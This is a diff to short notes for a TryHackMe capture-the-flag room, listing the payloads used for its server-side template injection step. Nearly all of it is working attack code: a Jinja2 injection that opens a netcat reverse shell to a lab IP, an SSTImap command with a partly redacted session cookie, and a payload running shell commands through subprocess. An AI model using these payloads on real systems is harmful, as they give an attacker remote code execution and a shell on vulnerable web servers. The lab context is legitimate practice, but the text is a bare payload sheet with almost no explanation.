@@ -1,12 +1,16 @@
 room link: https://tryhackme.com/room/rabbitstore
 YouTube video walk throug: https://youtu.be/BLEUNfBgNAg
 
-Here the payload used on SSTI (Server-side template injection) part in this room:
+✅ Here the payload used on SSTI (Server-side template injection) part in this room:
 
-revers shell:
+✅revers shell:✅
 {"username":"{{request.application.__globals__.__builtins__.eval('__import__(\"os\").popen(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.192.103 1234 >/tmp/f\").read()')}}"}
 
-other payload
+✅revers shell using SSTIMAP✅
+
+python3.9 sstimap.py -u "http://storage.cloudsite.thm/api/fetch_messeges_from_chatbot" -m POST -H "Content-Type:application/json" --data '{"username":"*"}' --data-type  json -C "jwt=eyJhbGciOi[redcated]LrSv3c"
+
+✅other payload✅
 
 {"username":"{{request.application.__globals__.__builtins__.__import__('subprocess').check_output('whoami', shell=True)}}"}
 
